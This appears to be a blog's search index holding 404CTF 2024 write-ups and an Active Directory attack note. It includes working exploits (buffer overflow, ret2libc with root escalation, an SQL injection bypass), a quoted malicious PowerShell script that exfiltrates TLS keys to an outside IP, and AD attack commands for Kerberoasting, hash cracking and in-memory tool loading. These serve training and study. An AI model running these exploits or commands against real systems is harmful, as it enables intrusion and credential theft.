balance and now…:Now that we have enough money to buy any ticket, lets buy the Tribune Laterale:We receive a message that tells us that we have bought the ticket and if we check our tickets:Lets obtain it and… Voilà:Le match du siecle [2/2]Now that we “bought” our ticket, and we would like to get a VIP one. But those ticket are not available anymore… Lets see how we got the first flag by intercepting the request:As we can see, we have in token the name of our ticket. Lets change it to VIP:As you can see we got another flag." }, { "title": "CTFs | 404CTF_2024 | Web | Exploit mag", "url": "/CTFs/404_CTF_2024/Web/Exploit_mag", "categories": "CTFs, 404_CTF_2024, Web", "tags": "Web", "date": "2024-04-25 00:00:00 +0200", "snippet": "Exploit magThe main idea here, is that we can’t access the articles from the website without paying for a subscription. But we can’t get any be cause we are redirected when we try to get one:At first I tried to remove the code that was on top of the text, but the hidden text is just a Lorem Ipsum nonsense. Because we can’t use gobuster, I lost a lot of time on this one and finally, I thought about the robots.txt file:As we can see, the google bots have access to anything on the server. So we can change our user agent to a google bot one. I used this user agent switcherAnd now we have access to the pages:Now if we look the Dataleak au 404 CTF article, we get the flag:" }, { "title": "CTFs | 404CTF_2024 | Steganographie | Regarder en stereo", "url": "/CTFs/404_CTF_2024/Steganographie/Regarder_en_stereo", "categories": "CTFs, 404_CTF_2024, Steganographie", "tags": "Stega", "date": "2024-04-25 00:00:00 +0200", "snippet": "Regarder en stereoThe image we have doesn’t look like anything I’ve ever seen:First, I searched “Regarder en stereo” online. I found this link about crossed vision and it was talking about a technique called autostéréogramme that looks like what we have:I searched an online tool that could manage to do that and fond this one:So the flag is (idk if you can read on the screenshot lmao) 404CTF{END_IS_NEAR}." }, { "title": "CTFs | 404CTF_2024 | Steganographie | L'absence", "url": "/CTFs/404_CTF_2024/Steganographie/L'absence", "categories": "CTFs, 404_CTF_2024, Steganographie", "tags": "Stega", "date": "2024-04-25 00:00:00 +0200", "snippet": "L’absenceHere we are given the following text:bonsoir, désolé pour le déranGement. je n'ai pas pu Y aller hier pour l'épreuve de barres asyMétriques. désolé si je N'ai pas été à lA hauteur de voS attenTes, je feraIs mieux aux épreuves publiQUes de dEmain. bises.franciS vigenere.ps :Kl qsfwm, r'qc hm s'ynfefmmh wej rc peahxik xi eg lmgigg i uni voqevmmem fuv vkq srnk jcy psmryurnl yiyli hkppee ehv fuck ! Syuf ahkmi orw rmztuw kmsbijifq, w'aa xvvcr ha jq eelkwkpij. Rc hbiub : 404KJZ{RwBmxrzHtaBywVxybramqAlj}As we can see, there are a lot of uppercase letters and the person that sent the letter is franciS vigenere. This helps us guess that the PS section is encrypted using the Vigenere cipher.The basic idea of the Vigenere cipher is that we are going to do a shift of letter that is based on the key. But we don’t have any key here??? Don’t we ?I split the clear text into a file called “message” and ran the following code to get the key (concatenation of all the uppercase letters):f = open(\"message\")key = \"\"for letter in f.read():\tif letter.isupper():\t\tkey += letterprint(\"[+] KEY : \", key)f.close()We get:Now we can use online tool to decode the message:So as we can see, the flag is 404CTF{NeVolezPasLesDrapeauxSvp}." }, { "title": "CTFs | 404CTF_2024 | Retro | Intronisation du CHAUSSURE", "url": "/CTFs/404_CTF_2024/Retro/Intronisation_du_CHAUSSURE", "categories": "CTFs, 404_CTF_2024, Retro", "tags": "Retro, Reverse", "date": "2024-04-25 00:00:00 +0200", "snippet": "Intronisation du CHAUSSUREThe binary is available here. In the main function we see the following code:We notice the password split character by character and the order is the order of variable creation. I wrote the following python code:arr = {\"local_27\": 't', \"local_21\": 'r', \"local_1e\": '1', \"local_1d\": 's', \"local_23\": 'n',\"local_24\": '1', \"local_26\": 'u', \"local_28\": '5', \"local_1f\": 'n', \"local_1c\": '3',\"local_20\": '0', \"local_25\": 'p', \"local_22\": 't'}passwd =\"\"for val in [\"local_28\", \"local_27\", \"local_26\", \"local_25\", \"local_24\", \"local_23\", \"local_22\", \"local_21\", \"local_20\", \"local_1f\", \"local_1e\", \"local_1d\", \"local_1c\"]:\tpasswd += arr[val]print(passwd)So the flag is 404CTF{5tup1ntr0n1s3}." }, { "title": "CTFs | 404CTF_2024 | Retro | Echauffement", "url": "/CTFs/404_CTF_2024/Retro/Echauffement", "categories": "CTFs, 404_CTF_2024, Retro", "tags": "Retro, Reverse", "date": "2024-04-25 00:00:00 +0200", "snippet": "EchauffementIn this challenge, we are given the echauffement.bin file. We open it using ghidra and we see the following code in the main function:As we can see, the secret_function_dont_look_here looks suspicious. Lets have a look at it:As we can see, the secret function is doing some mathematical operations on the secret data. Is we manage to get the secret_data we could do the same process to recover its original value. In ghidra the secret_data point to the DAT_00102008 variable that looks like:I recovered all those hex value and put them in my python code. I reverted the for loop of the C code in python and we have the following code:secret_data = bytes.fromhex(\"68 5f 66 83 a4 87 f0 d1 b6 c1 bc c5 5c dd be bd 56 c9 54 c9 d4 a9 50 cf d0 a5 ce 4b c8 bd 44 bd aa d9\")flag = \"\"for i in range(len(secret_data)):\tflag += chr(int((secret_data[i] + i)/2))print(flag)And when we run this code, we have the flag 404CTF{l_ech4uff3m3nt_3st_t3rm1ne}" }, { "title": "CTFs | 404CTF_2024 | Retro | Bugdroid Fight", "url": "/CTFs/404_CTF_2024/Retro/Bugdroid_Fight", "categories": "CTFs, 404_CTF_2024, Retro", "tags": "Retro, Reverse", "date": "2024-04-25 00:00:00 +0200", "snippet": "Bugdroid FightHere, we have the following apk.First I converted the apk into a JAR file using the following command:./dex-tools-v2.4/d2j-dex2jar.sh Bugdroid_Fight_-_Part_1.apk The dex-tools came from this repo.Now that I have the JAR file, I can open it in a Java decompiler like those and now we have access to the java source code:We can see that it is calling MainActivityKt so we go there and have the first part of the flag:We see under this the concatenation of 3 strings that create the flag:So we already have Br4v0_tU_as_. We have in Utils the variable lastPart :So now we know that the flag is Br4v0_tU_as_XXXXX_m3S5ag3!. The second part of the flag is in R.string.attr_special. But when we go to R.string.attr_special, we only have the index of this value. The string is located under a values folder into a string.xml file:So the flag is obviously 404CTF{Br4v0_tU_as_tr0uv3_m0N_m3S5ag3!}." }, { "title": "CTFs | 404CTF_2024 | ROSO | Not on my watch", "url": "/CTFs/404_CTF_2024/ROSO/Not_on_my_watch", "categories": "CTFs, 404_CTF_2024, ROSO", "tags": "ROSO, OSINT", "date": "2024-04-25 00:00:00 +0200", "snippet": "Not on my watchHere, we have the following image:The first thing I searched was the strings at the top of the watch waltham mass AWWCO. This gave me the website of pocketwatchdatabase. From here, I just had to give it the serial number 15404141:And thanks to this serial number, we have a lot of information, the number of mechanism sold included:So the flag is 404CTF{197,100}." }, { "title": "CTFs | 404CTF_2024 | ROSO | Legende", "url": "/CTFs/404_CTF_2024/ROSO/Legende", "categories": "CTFs, 404_CTF_2024, ROSO", "tags": "ROSO, OSINT", "date": "2024-04-25 00:00:00 +0200", "snippet": "LegendeHere, we are given the following image:I couldn’t find anywhere this image online. But we are told that we need to find “one of the first French ski legends” and that here, he will win his third world champion title this year (year of the picture).So I searched légendes du ski français and found this website. This gives us a lot of name but it narrow down to several person.When I searched for Émile Allais Chamonix 1937 I found this image that looks like the one we have:So the flag was 404CTF{emile-allais_chamonix}." }, { "title": "CTFs | 404CTF_2024 | Investigation Numerique | Vaut mieux sécuriser que guérir", "url": "/CTFs/404_CTF_2024/Investigation_Numerique/Vaut_mieux_securiser_que_guerir", "categories": "CTFs, 404_CTF_2024, Investigation Numerique", "tags": "Forensique, Forensic", "date": "2024-04-25 00:00:00 +0200", "snippet": "Vaut mieux sécuriser que guérirThis challenge had no sense for the first part of the flag, but we will see that later.Here we have a 2G memory dump. The fist thing, we notice is that we have a powershell instance running when we run the pstree command:We can list the files to find the path to the powershell history as follows:As we can see, the last command was rm hascked.ps1 and we can wonder that this script deleted previous commands because the history file is empty. Because the file was deleted, we can’t recover it… Or can’t we ?First of all i dumped the memory of the process pwoershell of PID 4852 using the command volatility2 -f memory.dmp --profile=Win10x64_17134 memdump --pid 4852. I then used the strings command on it and stored the result in a file to be able to analyse only readable characters. In this proc dump, we can find interesting information when we search the string hacked.ps1 but we also can find information when searching for a string ending by .ps1 (I used the regex [a-zA-Z0-9]{1,9}\\.ps1)We can see another interesting information, that is the name of the task we are looking for:Ok, now we know that the task name is LUL… It could be great if we could get the full content of hacked.ps1 and sound.ps1. As we can see in the previous screenshot, we have a bit of powershell code in the dump file of the powershell process. The problem is that it is not a one bloc code but instead it is scatted in the whole dump. To be able to get the full content of the hacked.ps1 script we are going to head to the Windows Event Logs.I dump every file on the system and then used the folowing command to set them as xml readable files xargs -a event_log.lst -I {} sh -c 'python3 python-evtx/scripts/evtx_dump.py \"{}\" &gt; \"event_logs_xml/$(basename {} .evtx).xml\"'.The flile called file.1296.0xffffd50eb9c93500.vacb.xml contains the full content of hacked.ps1:With this, we can fully understand the kill chain (but it isn’t needed for the challenge…). We can find the hacked.ps1 script on Jakoby github with the clean-exfil program used in by the attacker. But the only thing we are interested in is located in the middle of the code:What does this script in the main line is creating a wallpaper to replace the one of the victim with a lot of information about the computer like the name of the user, the location, the wifi passwords saved… The string e1ByQG5rM2Qt wasn’t in the original script of Jakoby but it didn’t worked when I tried to use it as the flag… Strange… Why an attacker would print a random string on the victim desktop if it isn’t the flag right ??? Well, my friend, this is where the nonsense begins. This string was base64 encoded. Why ? I don’t know. Why an attacker would print a base64 string on a victim computer ? The victim won’t understand it so… (You may have understood that it took me a while to find that this string was base64 encoded, where finding it was pretty easy…).Well at least we have the full flag now… And… Voilà 404CTF{Pr@nk3d-LUL} {Pr@nk3d- is the base64 decoded string of e1ByQG5rM2Qt and LUL is the name of the task executing sound.ps1 Not that using the process dwm.exe or explorer.exe, we could have find the string e1ByQG5rM2Qt by printing the desktop content (that was how I found it first). You can find the steps on this CTF" }, { "title": "CTFs | 404CTF_2024 | Investigation Numerique | Un boulevard pour pointer", "url": "/CTFs/404_CTF_2024/Investigation_Numerique/Un_boulevard_pour_pointer", "categories": "CTFs, 404_CTF_2024, Investigation Numerique", "tags": "Forensique, Forensic", "date": "2024-04-25 00:00:00 +0200", "snippet": "Un boulevard pour pointerIn this challenge, we are given a zip file containing two PDF and a disk image. The two PDF contains linux forensic commands like file, strings, fdisk -l or mmls.First lets run the fdisk -l command to get more information on the disk image:As we can see, there are three partitions and one of the (Linux root (x86-64)) is 5.5G big. Lets mount this partitions on local directories:Now if we look into the partition2 folder we can see the following structure:We can now go into the /root folder and read the .bash_history file we can see the following information:As we can see, we have a backup file that was saved using xfsdump. After a bit of research, I found this blog about xfsdump and xfsrestore so I used the following command to recover the original home folder:Now we can navigate to the backup_folder and list the files:And now, we have the flag in the last PDF:So the flag is 404CTF{bi1_joué_br4vo_c_le_fl4g}." }, { "title": "CTFs | 404CTF_2024 | Investigation Numerique | Tir aux logs", "url": "/CTFs/404_CTF_2024/Investigation_Numerique/Tir_aux_logs", "categories": "CTFs, 404_CTF_2024, Investigation Numerique", "tags": "Forensique, Forensic", "date": "2024-04-25 00:00:00 +0200", "snippet": "Tir aux logsIn this challenge, we are given a text log file of 56 lines. The first look we have at the file, it looks like someone is trying to do an SQLi:There was two ways to solve it here. Either you understand SQLi or you look at status codes. I used the command cat access.log| awk '{print $7}' for better reading:We can notice the admin\"#&amp;password=test. This allows to bypass the verification of the password variable for the user admin. As we can also see, we have a status code of 302 and right after a status code of 200 on the admin.php page. In the previous logs the pattern 302 before a 200 on the admin page refer to a successful connection.The flag is 404CTF{?username=admin%27%23&amp;password=test}" }, { "title": "CTFs | 404CTF_2024 | Investigation Numerique | Darts Bank", "url": "/CTFs/404_CTF_2024/Investigation_Numerique/Darts_Bank", "categories": "CTFs, 404_CTF_2024, Investigation Numerique", "tags": "Forensique, Forensic", "date": "2024-04-25 00:00:00 +0200", "snippet": "Darts BankIn this challenge, we are given this pcap file. If we open it using wireshark, we can see a lot of HTTP traffic. When we click on the first one and follow the TCP stream, we get the following output on the third stream:As you can see, this is some powershell script that has been base64 encoded. Once decoded and deobfuscated, we obtain the following code (available here):foreach($bbbbbbbbbbbb in Get-ChildItem -Recurse -Path C:\\Users -ErrorAction SilentlyContinue -Include *.lnk){$bbbbbbbbbbbbbbb=New-Object -COM WScript.Shell;$bbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb); if($bbbbbbbbbbbbbbbb.TargetPath -match 'chrome\\.exe$'){ $bbbbbbbbbbbbbbbb.Arguments=\"--ssl-key-log-file=$env:TEMP\\defender-res.txt\"; $bbbbbbbbbbbbbbbb.Save(); }}$count=0;$file_path=\"$env:TEMP\\defender-res.txt\";$byte_array=[byte[]](215,194,...,120);while($true){ $file_info=Get-Item -Path $file_path; $file_size=$file_info.Length; if($file_size -gt $count){ $defender_res=[System.IO.File]::Open($file_path,[System.IO.FileMode]::Open, [System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite); $defender_res.Seek($count,[System.IO.SeekOrigin]::Begin)|Out-Null; $b64_str=New-Object byte[] ($file_size - $count); $defender_res.read($b64_str,0,$file_size - $count)|Out-Null; for($i=0;$i -lt $b64_str.count;$i++){ $b64_str[$i]=$b64_str[$i] -bxor $byte_array[$i % $byte_array.count]; } $data=[Convert]::ToBase64String($b64_str); Write-Output $data; Invoke-WebRequest -Uri http://192.168.78.89/index.html -Method POST -Body $data|Out-Null; $defender_res.Close()|Out-Null; } $count=$file_size; Start-Sleep -Seconds 5;}The problem here was to understand what this powershell does. And it was “just” a XOR between the key (big string of byte) and the message saved in defender-res.txt. The encoded message could be found in the next streams. I exported every index.html and used this script. I first read the content of each index.html file that I exported and then decode the base64 to XOR it with the key.We get the following result:After a bit of research, I found this article on how to decrypt SSL traffic in Wireshark. So we need to save the content of all those index.html file decoded into a single file and put it into Wireshark like so:Now, we can read the content of all HTTPS messages. We can use the filter http2.data.data &amp;&amp; data-text-lines contains \"404CTF\" to find the flag easily and… Voilà:The flag is 404CTF{En_pl31n_d4ns_l3_1337_v1@_sUp3r_TLS_d3crypt0r}." }, { "title": "CTFs | 404CTF_2024 | Investigation Numerique | Du poison", "url": "/CTFs/404_CTF_2024/Investigation_Numerique/Du_poison", "categories": "CTFs, 404_CTF_2024, Investigation Numerique", "tags": "Forensique, Forensic", "date": "2024-04-25 00:00:00 +0200", "snippet": "Du poisonIn this AI challenge, we are tasked to deteriorate the accuracy of the AI model that is trained locally. In this challenge, to be able to do this, we can modify the value of the weights.In an AI, weights are adjustable parameters that determine how data is processed and interpreted by the AI model during learning. Each connection between neurons in an artificial neural network has an associated weight, representing the significance of that connection in the model.Weights are crucial because they directly influence the performance and predictive capability of an AI model. During the learning phase, the model adjusts these weights to minimize the error between the model’s predictions and the ground truth of the training data. The better the weights are adjusted, the more the model is capable of generalizing and producing accurate predictions on new data.Modifying the values of weights can be critical because it can drastically alter the behavior and performance of the model. If weights are modified inappropriately or unintentionally, it can lead to incorrect results, poor generalization, or even total model failure. For example, incorrect weights can lead to erroneous predictions, loss of interpretability of the model, or even undesirable consequences in critical applications such as health or safety. Therefore, handling weights must be done with caution and within the framework of rigorous design and validation of the AI model.So now that we know what are the weights, we can provide random values and expect to have a poor accuracy. But first lets check the code to know where we need to do the modifications:As you can see the original python notebook, we have the model_base used in the train_and_test function. The model_base variable stores the weights so we just have to recover their content and change their values. Not that we have an accuracy of 94% and we need to get under 50%.We just have to add 10000 to the weights and it should get us pretty low. To do that we can use the following code:As you can see, we have now an accuracy of 8%. So it is a bit under the 50% required XD. We can now launch the end of the code and…Voilà. The flag is 404CTF{0h___dU_P01sON}.The full colab code is available here" }, { "title": "CTFs | 404CTF_2024 | Exploitation de Binaire | Pseudoverflow", "url": "/CTFs/404_CTF_2024/Exploitation_de_Binaire/Pseudoverflow", "categories": "CTFs, 404_CTF_2024, Exploitation de Binaire", "tags": "Binary", "date": "2024-04-25 00:00:00 +0200", "snippet": "PseudoverflowHere we are given the course binray. When opened in Ghidra, we can see the following: At first, we had two variables that had the hex values of perds and \\0. But once we redefined the type of the first variable as an array of five characters it prints us like above.We understand here that we need to modify the content of the var_to_modif variable.If we look at the code in GDB, we can see where the variable is saved.We set a breakpoint at the leave instruction and run the program. We use a payload \"A\"*106+\"B\"*6 :As we can see, we have overwritten the content of the variable. Now we need to put the correct value. For that, I used a python code:from pwn import *gagne = 0x656e676167cmd = b\"cat flag.txt #\"my_len = 106 - len(cmd)payload = cmd + b\"A\"*my_len + p64(gagne)#p = process(\"./course\")SERV = \"challenges.404ctf.fr\"PORT = 31958p = remote(SERV, PORT)print(p.recvuntil(b\"pseudo :\").decode())print(payload.decode())p.sendline(payload)p.recvline().decode()print(\"[+] FLAG : \"+p.recvuntil(b\"}\").decode())As you can see, I wrote my payload (cat flag.txt #) at the beginning and then used some As as padding and finally, the overwrite is done by the hex value of the word gagne. The # is very important. It allows to comment the rest of the payload. This allows us not to have an error when sending our shell-code.And we get the flag:The flag is 404CTF{0v3rfl0w}." }, { "title": "CTFs | 404CTF_2024 | Exploitation de Binaire | Jean Pile", "url": "/CTFs/404_CTF_2024/Exploitation_de_Binaire/Jean_Pile", "categories": "CTFs, 404_CTF_2024, Exploitation de Binaire", "tags": "Binary, ret2libc, libc", "date": "2024-04-25 00:00:00 +0200", "snippet": "Jean PileHere, we have the following binary. First, lets check the type of the file and its protections:So we know that the ASLR is enabled and that we can execute code in the stack (NX disabled).When we open it, we see nothing really interesting in the main but the main code is available in the service() function:As we can see, the plat variable is 40 bytes long but then when select our dish, we can put 200 character in it (200 bytes).First, lets put a breakpoint at the leave instruction of the service function:Now we can run the program and send a custom payload like \"A\"*40+\"B\"*8+\"C\"*8+\"D\"*8 for one command:Now lets look at the stack: Note the use of g in our x/gx command. This is because, we are running an 64 bit ELF.We notice the return address is overwritten by our D (0x44). This allows us to know that the offset we are going to use is 40+8+8 (56).First I tried to put a lot of nop in the stack and try to point in the middle of those nop so that my shell-code could be executed. But because of ASLR, this isn’t possible. Shell-codes can be found at https://shell-storm.org/shellcode/I found this blog that talks about ret2libc attack. I’ll let you read it to have a better understanding about this kind of attacks, here we are just going to perform it. First we need to get the address of some objects. As in the blog, we are going to search for the main, put, printf and pop rdi gadget addresses:So we are going to take the PLT addresses for every object except for the printf because we need it to come from the GLIBC to be able to leak the address of the GLIBC. So our python code looks like:# Stage 1 (Leaking the address of printf@GLIBC)#objdump -d jean_pile | grep _startplt_main = p64(0x4006e0)plt_put = p64(0x400660)got_printf = p64(0x602020)#ROPgadget --binary jean_pile | grep \"pop rdi\"pop_rdi = p64(0x400b83)junk = b\"A\" * 56With all of this information, we can leak the address of the printf from the GLIBC and find which one is running on the remote server:Now we go to the https://libc.blukat.me/ website to find which libc is used:We can download the first one and try with it. If this don’t work we will need to try the second, third… and so on until we find the correct one.With the GLIBC downloaded, we can use readelf and strings to get all the information we need:With all this information we will have in our python code the following:# Stage 2 (Obtaining the addresses and pwning)#readelf -s libc6-amd64_2.36-9+deb12u4_i386.so | grep printlibc_printf = 0x525b0libc_sys = 0x4c490libc_exit = 0x3e680libc_setuid = 0xd54b0#strings -a -t x libc6-amd64_2.36-9+deb12u4_i386.so | grep /bin/shlibc_sh = 0x196031# Calculate the the base address of libclibc_main = leaked_printf - libc_printflog.success(\"libc_main:\" + hex(libc_main))# Add the offsets to the base address to obtain the addresses libc functionssys = p64(libc_main + libc_sys)sh = p64(libc_main + libc_sh)setuid = p64(libc_main + libc_setuid)# Setting 0 as the first argument to setuid will escalate to root priviligesroot = p64(0)payload = junk + pop_rdi + root + setuid + pop_rdi + sh + sysYou can find the full code here.Now we can run our code and…Voilà:So the flag is 404CTF{f4n_2_8denn3u}" }, { "title": "CTFs | 404CTF_2024 | Cryptanalyse | Bebe Nageur", "url": "/CTFs/404_CTF_2024/Cryptanalyse/Bebe_Nageur", "categories": "CTFs, 404_CTF_2024, Cryptanalyse", "tags": "Crypto, Python", "date": "2024-04-25 00:00:00 +0200", "snippet": "Bebe NageurIn this challenge, we are tasked to retro-engineer a python code and exploit its cryptographic flaws. The given code is the following:from flag import FLAGimport random as rdcharset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!\"def f(a,b,n,x):\treturn (a*x+b)%ndef encrypt(message,a,b,n):\tencrypted = \"\"\tfor char in message:\t\tx = charset.index(char)\t\tx = f(a,b,n,x)\t\tencrypted += charset[x]\treturn encryptedn = len(charset)a = rd.randint(2,n-1)b = rd.randint(1,n-1)print(encrypt(FLAG,a,b,n))# ENCRYPTED FLAG : -4-c57T5fUq9UdO0lOqiMqS4Hy0lqM4ekq-0vqwiNoqzUq5O9tyYoUq2_So we notice that every character from the FLAG is encrypted using a random a and a random b. The n on the other hand is static because it’s just the length of our charset. I ran the program with different input like AAA, or BBB and I got as a result 444, 888. So I believed that when a character is present in the encrypted flag every occurrences of this encrypted character represent the same one. As an example, the beginning of the encrypted flag is -4- so we guess from that, that every - represent a 4 and every 4 represent a 0.At first I tried to solve the modulus equations but I found that hard to do :) so I found an easier way to exploit that.As we said earlier, each encrypted character will gives us the same result when encrypted. So why not just create a dictionary with each key representing an encrypted character from the charset and each value, its decrypted (original) value.I added the following code after the given one:prefix = \"404CTF{\"enc_flag = \"-4-c57T5fUq9UdO0lOqiMqS4Hy0lqM4ekq-0vqwiNoqzUq5O9tyYoUq2_\"def get_a_b():\tfor new_b in range(1,n-1):\t\tfor new_a in range(2,n-1):\t\t\tif encrypt(prefix, new_a, new_b, n) == \"-4-c57T\":\t\t\t\tprint(\"[+] a = \"+str(new_a))\t\t\t\tprint(\"[+] b = \"+str(new_b))\t\t\t\treturn new_a,new_bnew_a, new_b = get_a_b()\"\"\"a=19b=6\"\"\"arr = {}# Create a dictionary with key=encrypted values=dec#ex: key:\"-\" and value:\"4\"for lettre in charset:\tnew_lettre = encrypt(lettre, new_a, new_b, n)\tif new_lettre not in arr.keys():\t\tarr[new_lettre] = lettreflag = \"\"for enc_val in enc_flag:\tflag += arr[enc_val]print(\"[+] FLAG : \"+flag)And voilà… We have the flag:" }, { "title": "Notes | AD | AD Basics", "url": "/Notes/AD/AD_Basics", "categories": "Notes, AD", "tags": "AD, Kerberos, LDAP, NTLM", "date": "2024-04-08 00:00:00 +0200", "snippet": "Active DirectoryIntroductionWell, well well… Here we are. Doing an Active Directory introduction note. Lets start by defining what is Active directory. Active Directory (AD), is the windows directory. It allows interconnection between computers and/or servers. The computers and servers in a domain (computer cluster) can have any distribution in it (Unix-like or windows).I will not get into too much detail on how active directory works, what is a domain, forest… I will focus only on the different protocols and attacks on it. If you want to get more information about how an AD works, and want basic or advanced knowledge on it, I advise you the great post Attacking Active Directory: 0 to 0.9.ProtocolsBefore talking about the attacks on AD, I will just talk about the basic protocols that we have on windows AD. First we will talk about the famous three headed dog… I mean Kerberos protocol.KerberosThe Kerberos protocol uses tickets. You ask tickets, you get tickets and you give tickets. But why do we need tickets ? Because you would, for example, access a service on the domain. For example, let’s say you would like to access a web server or a server that share files… You will have to authenticate to this service. In an AD environment, you will, most of the time, use the Kerberos protocol for the authentication process (or NetNTLM but we will talk about it later).Because an image is worth a big speech: paloaltonetworks image Lets break this down. Lets say you want to access a server. First, you have to connect to your workstation. When you enter your credentials, you request a TGT (Ticket Granting Ticket) to the AS (Authentication Service). Then, the AS checks if you are who you pretend to be (username and key derived from your password). If your credentials are valid, the AS will provide you with the requested TGT. Now, when you try to connect to a server, it will check if the Kerberos protocol is available for this server. If so, you will request a ST (Service Ticket) to the TGS (Ticket Granting Service). To be able to do that, the TGT is sent to the TGS so it can authenticate the client. With the ST, you just have to give it to the server that will check the validity of the ticket and authenticate you. Be aware of the difference between ST and TGS. The TGS is the SERVICE providing the TICKET, where ST is the TICKET.The KDC (Key Distribution Center) is the fusion of an AS and a TGS. It is often the DC (Domain Controller) that has the role of KDC.NTLMThere is often a bit of confusion when we talk about NTLM. Do we speak about an authentication protocol or about a hash algorithm ? Well the authentication protocol is often called NTLM but the full name is Net-NTLM. There are different versions of this protocol like Net-NTLMv1 or Net-NTLMv2. For now, only these 2 versions exist. And when we speak about a hash we just say NTLM hash. The Net-NTLM hash is the challenge + the response. But what people think of when we speak about NTLM hash is the NT hash concatenated to LM hash. This hash (NT + LM hash) can be used for authentication, relayed or cracked offline, where the Net-NTLM hash can only be cracked offline.Pass The Hash leverages a feature of Windows’ NTLM authentication, where a user’s hashed password (rather than the plaintext password) can be used for authentication across networked services, essentially allowing the hash to serve as an equivalent credential within Windows environments. The Net-NTLM hash can’t be passed. You can’t do a PtH (Pass the Hash) attack.The client uses its NT hash during the NTLM authentication mechanism in order to calculate a response for the server.NT hash can be used to authenticate to several services (ex: SMB, LDAP, RDP…).The following scheme shows how the NTLM authentication mechanism works: First the client sends a NEGOCIATE message to the server. This message allows to share security information between the client and the server (ex: NTLM version to use) Then the server generates a CHALLENGE and sends it into a CHALLENGE message. (It also confirms the negotiated options and sends information about the server like computer name, version, domain name…) Now that the client has the challenge, it calculates the response using the client key (NT hash). Now, the client sends the response to the challenge to the server. Finally, the server will verify that the challenge response is correct. If so, the communication is now possible between the two and the following messages may be signed with the session key. Note that on the step “3.” the client may also create, if required, a session key and encrypts it using a key derived from the NT Hash. The session key is then sent to the server with the response of the challenge.LDAPLDAP provides a standardized way to access and manage directory services, making it a fundamental component of many network infrastructure setups. For example, you can use LDAP to list all the users of a domain.AttacksNow that we know more about how an AD is working, we are going to talk about the most basic attacks on it.KerberoastingIn Active Directory, a ST can be requested by any user for any service that is registered in the domain database through an SPN (Service Principal Names), regardless of whether the service is running or not. Only service accounts should have an SPN but sometimes a regular user has an SPN. An SPN looks like service_class/machine_name[:port][/path]The Kerberoast attack consists of requesting STs for those services of regular user accounts and try to crack them to get the user passwords. Usually, the users that have services also have privileges, so these are juicy accounts.Enumeration / ExploitationFirst of all, we need a user of the domain to be able to launch this attack. Once you have that, you can use LDAP queries, Bloodhound or GetUsersSPN (from impacket) to find the potential vulnerable users. The basic command:GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD -outputfile kerberoasting.hashes You can use hashes instead of the user password that you own by specifying the -hashes LM_HASH:NT_HASH. This is called PtH (Pass the Hash)For better visualization, you can use bloodhound-python to export all the necessary information from the domain using commands like:bloodhound-python -u $USER -p $PASSWORD -ns $DC_IP -d $DOMAIN.local -c all --zipNow that you exported the data with bloodhound-python, you can use the default bloodhound GUI program to see any information about the domain you are trying to exploit. There is an option to see all Kerberoastable account in a graph format.The same thing can be done using NetExec :nxc ldap $DC_IP -u $USER -p \"$PASSWORD\" -d $DOMAIN.local --kerberoasting KERBEROASTINGYou can now use tools like hashcat to try cracking the recovered hash:hashcat -m 13100 Kerberoastables.txt /usr/share/wordlists/rockyou.txt Note that you can get a ST for a service account. You won’t be able to crack it because it is generated automatically by the DC. It is a 120 random characters long passwords. Good luck cracking this XD.AS-REPRoastingBecause some applications don’t support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline.As for the Kerberoast attack, you can also use Bloodhound GUI to search AS-REPRoastable users. But here we are going to look only for the command line exploit.Enumeration / ExploitationGetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC_IP \"$DOMAIN/$USER:$PASSWORD\"Here we just listed the potentially vulnerable users and exported their hash from the TGT in a file called ASREProastables.txt.If this doesn’t work or if you don’t have a valid pair of credentials you can provide a user list like so: Note that you can use the -hashes \"$LM_HASH:$NT_HASH\" to use the hash of the user you own instead of its password.We can now try to crack them all using hashcat:hashcat -m 18200 -a 0 ASREProastables.txt /usr/share/wordlists/rockyou.txtIt may be worth mentioning that we can exploit AS-REProasting as an unauthenticated attacker. We just need to know the domain name (visible in crackmapexec output) and the username (that we can bruteforced with kerbrute or using a user list like we did earlier).Golden / Silver TicketsFirst of all, Golden and Silver tickets are used for persistence. This mean that you won’t use it on CTFs or pentest but it is a well known persistence method so it is good to know it.Silver TicketsLets start with silver tickets. A Silver Ticket grants us access to a specific service. It allows us to generate a ST (Service Ticket) for this service. To do that, we need to know the kerberos key of this service account. To recover this key you can, for example, dump the lsass process or use tools like secretsdump (stealthier). Tools like mimikatz (kerberos::golden) or the impacket ticketer.py can be used to do that.Golden TicketsGolden Tikets allows us to have unrestricted access to a whole domain by generating a TGT for any user. To be able to do that, we need to have access to the krbtgt key and to get this, we need to be domain admin (DA).DelegationsDelegation is a mechanism in which a machine (the delegation server) can impersonate a user on a service. This means that the service thinks that the user ask for the resource where in reality it is the delegation server that is asking the resource to the server and then forward it to the user.I will not get into too much detail here. you can have more information about the delegation on the hacker recipes or hackndo. They both are inspired by the article of Elad Shamir Wagging the Dog and this article is much more detailed than the two previous blogs. Here is also a talk about delegation presented by Shutdown (@nwodtuhs). (The french version here). I will use the appellation delegation server. This can be any kind of server (web, share, database…) that does the mechanism of delegation. Its role isn’t only to delegate.Unconstrained DelegationThis type of delegation was the first one created. It is not recommended to use it anymore. This allows the Unconstrained Delegation server to impersonate any user for any service. The only users that can’t be impersonated are the one in the group Protected Users and the one with the flag NOT_DELEGATED in the UserAccountControl attribute of the user account. Source: HacknDo The client connects to the service by sending its ST. Inside his ST, the DC puts a copy of the user’s TGT. That service uses this TGT to impersonate the client to any other service.To exploit the delegation mechanism, you’ll need the hash of the service account or being admin of the machine.Here we will have as an exemple an unconstrained delegation between PC and DC.First connect to the machine (PC) then launch Rubeus in memory like so:$data = (New-Object System.Net.WebClient).DownloadData('http://$KALI_IP:8080/Rubeus.exe')$assem = [System.Reflection.Assembly]::Load($data);[Rubeus.Program]::MainString(\"triage\");This command allows you to list all available tickets. Now we can use coercer to force a connection from PC to DC:python3 coercer.py -u $ADMIN_PC -d $DOMAIN_PC -p $PASS_ADMIN_PC1 -t $DC -l $PC_NAME Now if you run again the triage command, you should see the krbtgt ticket in the list. To recover it, you can use the following command:[Rubeus.Program]::MainString(\"dump /user:$MACHINE_NAME_DC 